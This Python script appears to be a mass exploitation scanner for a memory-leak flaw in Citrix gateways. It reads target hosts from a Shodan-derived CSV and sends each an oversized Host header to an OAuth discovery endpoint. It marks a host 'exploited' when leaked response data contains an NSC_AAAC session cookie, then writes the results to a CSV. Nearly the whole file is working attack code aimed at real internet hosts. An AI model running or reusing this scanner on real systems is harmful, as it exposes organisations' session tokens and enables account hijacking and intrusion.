#!/usr/bin/env python3

import argparse
import os
import sys

import datetime
import pandas as pd
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def is_exploited(url):
    try:
        headers = {"Host": "a" * 24576}
        r = requests.get(url, headers=headers, verify=False, timeout=10)
        if r.status_code == 200:
            print('kkc')
            if r.text[131050:].find('NSC_AAAC') > -1:
                return True
        return False
    except Exception as e:
        #print(e)
        return False


if __name__ == "__main__":

    path_to_csv = os.path.join(os.path.dirname(__file__), "..", "data",
                               "use_shodan_and_ipdn.csv")
    fields = pd.read_csv(path_to_csv).to_dict(orient='records')
    print(f"Records found: {len(fields)}")
    headers = {"Host": "a" * 24812}

    label_keys = ['exploited', 'timestamp']
    output = []
    for field in fields:
        DEFAULT_VALUE = None
        label = dict.fromkeys(label_keys, DEFAULT_VALUE)

        SCHEMA = 'http'
        if field['ssl'] is not None:
            SCHEMA = 'https'

        field[
            'url'] = f"{SCHEMA}://{field['service']}/oauth/idp/.well-known/openid-configuration"

        label['timestamp'] = datetime.datetime.now().strftime(
            "%Y-%m-%d %H:%M:%S")
        label['exploited'] = is_exploited(field['url'])
        output.append(field | label)
        print(field['url'], label['exploited'])

    df = pd.DataFrame(output)
    path_to_csv = os.path.join(os.path.dirname(__file__), "..", "data",
                               "use_citrix.csv")
    df.to_csv(path_to_csv, index=False, encoding='utf-8-sig')
